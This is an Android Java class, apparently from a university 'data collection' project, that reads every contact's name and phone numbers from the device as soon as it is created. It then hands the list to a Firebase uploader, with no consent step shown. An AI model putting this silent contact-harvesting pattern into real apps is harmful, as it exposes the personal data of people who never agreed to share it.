package es.upm.etsisi.pas.recopilacion_datos;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;

import androidx.appcompat.app.AppCompatActivity;

import java.util.ArrayList;

public class RetrieveContacts extends AppCompatActivity  {
    ArrayList<ContactEntity> contactList;

    public RetrieveContacts(ContentResolver cr) {
        contactList = getAllContacts(cr);
        FirebaseContacts firebasecontacts = new FirebaseContacts();
        firebasecontacts.UploadContacts(contactList);
    }


    @SuppressLint("Range")
    private ArrayList<ContactEntity> getAllContacts(ContentResolver cr) {
        ArrayList<ContactEntity> contactList = new ArrayList<>();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
        if(cur == null)
            return contactList;
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex( ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);

                    ArrayList<String> phoneList = new ArrayList<>();
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phoneList.add(phoneNo);
                    }
                    pCur.close();
                    contactList.add(new ContactEntity(name, phoneList));
                }
            }
        }
        cur.close();
        return contactList;
    }
}
